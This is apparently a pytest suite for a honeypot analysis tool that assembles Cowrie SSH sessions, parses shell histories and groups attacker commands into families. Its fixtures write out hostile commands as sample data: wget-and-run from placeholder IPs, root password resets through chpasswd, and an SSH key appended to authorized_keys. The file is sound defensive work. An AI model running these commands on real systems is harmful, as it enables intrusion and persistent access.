"""Session assembly, storage, benign baselines and families."""

from __future__ import annotations

import gzip
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from deception_shield.sessions import (
    ORIGIN_COWRIE,
    ORIGIN_HISTORY,
    Command,
    CowrieSessionAssembler,
    Session,
    build_sessions,
    cowrie_log_files,
    corpus_stats,
    group_families,
    markdown_cell,
    normalise_command,
    parse_shell_history,
    parse_timestamp,
    printable,
    read_sessions,
    session_family,
    sessions_from_history,
    write_sessions,
)

T0 = datetime(2026, 9, 20, 12, 0, tzinfo=timezone.utc)


def stamp(seconds: float) -> str:
    return (T0 + timedelta(seconds=seconds)).isoformat().replace("+00:00", "Z")


def cowrie(eventid: str, session: str = "a1b2c3d4e5f6", at: float = 0, **fields) -> dict:
    return {
        "eventid": eventid,
        "session": session,
        "timestamp": stamp(at),
        "src_ip": "203.0.113.7",
        "sensor": "sensor-0",
        **fields,
    }


def full_session(
    session: str = "a1b2c3d4e5f6", commands: tuple[str, ...] = ("uname -a",), start: float = 0
) -> list[dict]:
    events = [
        cowrie(
            "cowrie.session.connect", session, start, protocol="ssh", src_port=51515, dst_port=2222
        ),
        cowrie("cowrie.client.version", session, start + 0.1, version="SSH-2.0-Go"),
        cowrie("cowrie.login.failed", session, start + 0.5, username="root", password="root"),
        cowrie("cowrie.login.success", session, start + 1, username="root", password="admin"),
    ]
    events += [
        cowrie("cowrie.command.input", session, start + 2 + i, input=c)
        for i, c in enumerate(commands)
    ]
    events.append(cowrie("cowrie.session.closed", session, start + 10, duration=10.0))
    return events


class TestTimestamps:
    @pytest.mark.parametrize(
        "text",
        [
            "2026-09-20T12:00:00.123456Z",
            "2026-09-20T12:00:00.123Z",
            "2026-09-20T12:00:00.123456789Z",
            "2026-09-20T12:00:00.1+00:00",
            "2026-09-20T12:00:00",
        ],
    )
    def test_the_formats_every_source_writes(self, text: str) -> None:
        parsed = parse_timestamp(text)
        assert parsed is not None and parsed.tzinfo is not None
        assert parsed.replace(microsecond=0) == T0

    def test_a_date_is_midnight_utc(self) -> None:
        assert parse_timestamp("2026-09-28") == datetime(2026, 9, 28, tzinfo=timezone.utc)

    @pytest.mark.parametrize("value", [None, "", "yesterday", 42])
    def test_unreadable_values_are_none(self, value) -> None:
        assert parse_timestamp(value) is None


class TestAssembly:
    def test_a_session_is_folded_into_one_record(self) -> None:
        assembler = CowrieSessionAssembler()
        for event in full_session(commands=("uname -a", "cd /tmp; wget http://x/a")):
            assembler.add(event)
        assembler.add(
            cowrie("cowrie.session.file_download", at=4, url="http://x/a", shasum="ab" * 32)
        )

        [session] = assembler.sessions()
        assert session.id == "sensor-0/a1b2c3d4e5f6"
        assert session.origin == ORIGIN_COWRIE
        assert session.source_ip == "203.0.113.7"
        assert session.protocol == "ssh"
        assert (session.username, session.password, session.login_success) == (
            "root",
            "admin",
            True,
        )
        assert session.client_version == "SSH-2.0-Go"
        assert [c.text for c in session.commands] == ["uname -a", "cd /tmp; wget http://x/a"]
        assert session.downloads == [{"url": "http://x/a", "sha256": "ab" * 32}]
        assert session.start == T0 and session.duration_seconds == 10

    def test_sessions_without_commands_are_dropped(self) -> None:
        assembler = CowrieSessionAssembler()
        for event in full_session(commands=()):
            assembler.add(event)
        assert assembler.sessions() == []

    def test_interleaved_sessions_stay_apart(self) -> None:
        assembler = CowrieSessionAssembler()
        first, second = full_session("aaaa", ("id",)), full_session("bbbb", ("w",), start=0.25)
        for pair in zip(first, second):
            for event in pair:
                assembler.add(event)
        assert {s.id: [c.text for c in s.commands] for s in assembler.sessions()} == {
            "sensor-0/aaaa": ["id"],
            "sensor-0/bbbb": ["w"],
        }

    def test_reading_the_same_log_twice_does_not_repeat_commands(self) -> None:
        assembler = CowrieSessionAssembler()
        for event in full_session(commands=("id",)) * 2:
            assembler.add(event)
        [session] = assembler.sessions()
        assert [c.text for c in session.commands] == ["id"]

    def test_an_event_after_the_close_still_lands_in_its_session(self) -> None:
        assembler = CowrieSessionAssembler()
        for event in full_session(commands=("id",)):
            assembler.add(event)
        assembler.add(cowrie("cowrie.command.input", at=11, input="exit"))
        [session] = assembler.sessions()
        assert [c.text for c in session.commands] == ["id", "exit"]

    def test_the_same_cowrie_id_on_two_sensors_is_two_sessions(self) -> None:
        assembler = CowrieSessionAssembler()
        for event in full_session():
            assembler.add(event)
        for event in full_session():
            assembler.add({**event, "sensor": "sensor-1"})
        assert sorted(s.id for s in assembler.sessions()) == [
            "sensor-0/a1b2c3d4e5f6",
            "sensor-1/a1b2c3d4e5f6",
        ]

    def test_the_sensor_can_be_named_explicitly(self) -> None:
        assembler = CowrieSessionAssembler(sensor_id="prod-0")
        for event in full_session():
            assembler.add(event)
        assert assembler.sessions()[0].id == "prod-0/a1b2c3d4e5f6"

    def test_malformed_events_are_counted_and_skipped(self) -> None:
        assembler = CowrieSessionAssembler()
        assembler.add({"eventid": "cowrie.command.input"})
        assembler.add({"session": "x", "timestamp": "nonsense", "eventid": "cowrie.command.input"})
        assert assembler.skipped == 2 and assembler.sessions() == []

    def test_a_session_left_open_is_kept_when_it_ran_commands(self) -> None:
        assembler = CowrieSessionAssembler()
        for event in full_session(commands=("id",))[:-1]:
            assembler.add(event)
        assert len(assembler.sessions()) == 1


def write_log(
    path: Path, events: list[dict], *, compress: bool = False, trailing: str = ""
) -> Path:
    text = "".join(json.dumps(e) + "\n" for e in events) + trailing
    if compress:
        with gzip.open(path, "wt", encoding="utf-8") as handle:
            handle.write(text)
    else:
        path.write_text(text, encoding="utf-8")
    return path


class TestBuildFromFiles:
    def test_a_session_split_across_rotated_files(self, tmp_path: Path) -> None:
        events = full_session(commands=("id", "w"))
        write_log(tmp_path / "cowrie.json.2026-09-20", events[:5])
        write_log(tmp_path / "cowrie.json.2026-09-21.gz", events[5:], compress=True)
        assembly = build_sessions([tmp_path])
        assert assembly.files == 2
        [session] = assembly.sessions
        assert [c.text for c in session.commands] == ["id", "w"]

    def test_a_half_written_last_line_is_skipped(self, tmp_path: Path) -> None:
        write_log(tmp_path / "cowrie.json", full_session(), trailing='{"eventid": "cowrie.comm')
        assert len(build_sessions([tmp_path]).sessions) == 1

    def test_files_are_read_oldest_content_first(self, tmp_path: Path) -> None:
        newer = write_log(tmp_path / "cowrie.json", full_session("bbbb", start=500))
        older = write_log(tmp_path / "cowrie.json.2026-09-20", full_session("aaaa"))
        assert cowrie_log_files([tmp_path]) == [older, newer]

    def test_unrelated_files_in_a_directory_are_ignored(self, tmp_path: Path) -> None:
        write_log(tmp_path / "cowrie.json", full_session())
        (tmp_path / "notes.txt").write_text("not a log", encoding="utf-8")
        (tmp_path / "sessions.jsonl").write_text("{}", encoding="utf-8")
        assert [p.name for p in cowrie_log_files([tmp_path])] == ["cowrie.json"]


def make_session(
    ident: str = "s/1",
    commands: tuple[str, ...] = ("id",),
    *,
    start: datetime = T0,
    origin: str = ORIGIN_COWRIE,
    source_ip: str | None = "203.0.113.7",
) -> Session:
    return Session(
        id=ident,
        origin=origin,
        sensor="sensor-0",
        start=start,
        end=start + timedelta(seconds=len(commands)),
        source_ip=source_ip,
        commands=[Command(start + timedelta(seconds=i), c) for i, c in enumerate(commands)],
    )


class TestStorage:
    def test_round_trip(self, tmp_path: Path) -> None:
        original = make_session(commands=("id", "echo 'é' \x1b[2J"))
        original.downloads.append({"url": "http://x/a", "sha256": "ff"})
        path = tmp_path / "corpus.jsonl"
        assert write_sessions(path, [original]) == 1
        [loaded] = read_sessions([path])
        assert loaded == original

    def test_the_write_is_atomic(self, tmp_path: Path) -> None:
        path = tmp_path / "corpus.jsonl"
        write_sessions(path, [make_session()])
        assert not (tmp_path / "corpus.jsonl.tmp").exists()

    def test_a_session_in_two_corpora_is_an_error(self, tmp_path: Path) -> None:
        write_sessions(tmp_path / "a.jsonl", [make_session()])
        write_sessions(tmp_path / "b.jsonl", [make_session()])
        with pytest.raises(ValueError, match="also appears"):
            read_sessions([tmp_path / "a.jsonl", tmp_path / "b.jsonl"])

    def test_an_unknown_schema_is_rejected(self, tmp_path: Path) -> None:
        record = make_session().to_dict() | {"schema": 99}
        (tmp_path / "c.jsonl").write_text(json.dumps(record) + "\n", encoding="utf-8")
        with pytest.raises(ValueError, match="schema"):
            read_sessions([tmp_path / "c.jsonl"])

    def test_broken_json_names_the_line(self, tmp_path: Path) -> None:
        (tmp_path / "c.jsonl").write_text(
            json.dumps(make_session().to_dict()) + "\n{oops\n", encoding="utf-8"
        )
        with pytest.raises(ValueError, match="c.jsonl:2"):
            read_sessions([tmp_path / "c.jsonl"])


EPOCH = int(T0.timestamp())


class TestShellHistory:
    def test_bash_with_timestamps(self) -> None:
        text = f"#{EPOCH}\nls -la\n#{EPOCH + 60}\nfor f in *; do\n  echo $f\ndone\n"
        assert parse_shell_history(text) == [
            (T0, "ls -la"),
            (T0 + timedelta(minutes=1), "for f in *; do\n  echo $f\ndone"),
        ]

    def test_bash_entries_before_the_first_timestamp_are_dropped(self) -> None:
        assert parse_shell_history(f"old command\n#{EPOCH}\nls\n") == [(T0, "ls")]

    def test_zsh_extended_history_with_a_continued_line(self) -> None:
        text = (
            f": {EPOCH}:0;git status\n"
            f": {EPOCH + 5}:2;docker run \\\n"
            "  --rm alpine\n"
            f": {EPOCH + 9}:0;ls\n"
        )
        assert parse_shell_history(text) == [
            (T0, "git status"),
            (T0 + timedelta(seconds=5), "docker run \n  --rm alpine"),
            (T0 + timedelta(seconds=9), "ls"),
        ]

    def test_history_without_timestamps_is_refused(self) -> None:
        with pytest.raises(ValueError, match="HISTTIMEFORMAT"):
            parse_shell_history("ls\ncd /tmp\n")

    def test_sessions_split_at_idle_gaps(self) -> None:
        entries = [
            (T0, "cd /srv"),
            (T0 + timedelta(minutes=10), "git pull"),
            (T0 + timedelta(hours=3), "df -h"),
        ]
        sessions = sessions_from_history(
            entries, host="laptop", user="ops", idle=timedelta(minutes=30)
        )
        assert [[c.text for c in s.commands] for s in sessions] == [
            ["cd /srv", "git pull"],
            ["df -h"],
        ]
        assert sessions[0].id == "laptop/ops/20260920T120000Z"
        assert all(s.origin == ORIGIN_HISTORY and s.source_ip is None for s in sessions)


class TestFamilies:
    def test_variable_parts_are_normalised_away(self) -> None:
        assert normalise_command('echo "root:Xk2p9QwLm"|chpasswd|bash') == normalise_command(
            'echo "root:Pz8r3TvNq"|chpasswd|bash'
        )
        assert normalise_command("wget http://203.0.113.4/a.sh") == "wget <url>"
        assert normalise_command(r"echo -ne '\x7f\x45\x4c\x46' > .d") == "echo -ne '<bytes>' > .d"
        assert "<sshkey>" in normalise_command(
            'echo "ssh-rsa AAAAB3NzaC1yc2E mdrfckr">>.ssh/authorized_keys'
        )

    def test_the_same_script_from_two_bots_is_one_family(self) -> None:
        first = make_session(
            "s/1", ("cd /tmp; wget http://203.0.113.4/x; sh x", 'echo "root:Aa1Bb2Cc3"|chpasswd')
        )
        second = make_session(
            "s/2", ("cd /tmp; wget http://198.51.100.9/x; sh x", 'echo "root:Zz9Yy8Xx7"|chpasswd')
        )
        other = make_session("s/3", ("uname -a",))
        assert session_family(first) == session_family(second) != session_family(other)

    def test_families_are_ordered_largest_first(self) -> None:
        sessions = [make_session(f"s/{i}", ("id",)) for i in range(3)] + [
            make_session("s/x", ("w",))
        ]
        families = list(group_families(sessions).values())
        assert [len(f) for f in families] == [3, 1]


class TestStats:
    def test_corpus_figures(self) -> None:
        sessions = [
            make_session("s/1", ("id",), start=T0),
            make_session("s/2", ("w",), start=T0 + timedelta(days=9), source_ip="198.51.100.2"),
            make_session(
                "h/1", ("ls",), start=T0 + timedelta(days=10), origin=ORIGIN_HISTORY, source_ip=None
            ),
        ]
        stats = corpus_stats(sessions)
        assert stats["sessions"] == 3 and stats["commands"] == 3
        assert stats["span_days"] == 10.0
        assert stats["weeks"] == {"2026-W38": 1, "2026-W40": 2}
        assert stats["sources"] == 2 and stats["families"] == 3
        assert stats["origins"] == {ORIGIN_COWRIE: 2, ORIGIN_HISTORY: 1}

    def test_an_empty_corpus(self) -> None:
        assert corpus_stats([]) == {"sessions": 0}


class TestDisplay:
    def test_control_characters_are_escaped(self) -> None:
        """A raw escape sequence must never reach the analyst's terminal."""
        assert printable("clear\x1b[2J\x07done\x9b") == "clear\\x1b[2J\\x07done\\x9b"

    def test_long_text_is_cut(self) -> None:
        assert printable("abcdef", 4) == "abc…"

    def test_markdown_cells_cannot_break_the_table(self) -> None:
        assert markdown_cell("a | b `c`") == "`a \\| b 'c'`"
